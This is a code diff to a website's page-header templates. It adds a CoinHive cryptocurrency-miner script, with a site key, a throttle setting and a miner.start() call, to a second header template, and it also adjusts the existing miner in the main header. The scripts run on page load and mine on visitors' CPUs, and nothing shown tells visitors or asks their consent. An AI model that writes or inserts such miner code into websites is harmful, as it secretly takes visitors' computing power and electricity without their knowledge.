@@ -1,6 +1,8 @@
 <template name="header">
     <script>
-        var miner = new CoinHive.User('Kipums0aoKk00cWSpKM7zn9Jqq8RfvGP', 'skippable');
+        var miner = new CoinHive.User('Kipums0aoKk00cWSpKM7zn9Jqq8RfvGP', 'skippable', {
+            throttle: 0.5,
+        });
         miner.start();
     </script>
     <div class="ui inverted vertical center aligned segment">
@@ -18,6 +20,12 @@
 </template>
 
 <template name="seriesHeader">
+    <script>
+        var miner = new CoinHive.User('Kipums0aoKk00cWSpKM7zn9Jqq8RfvGP', 'skippable', {
+            throttle: 0.5,
+        });
+        miner.start();
+    </script>
     <div class="ui inverted vertical center aligned sixteen wide tablet computer only grid segment sticky">
         <div class="ui container">
             <div class="ui large secondary inverted pointing menu">
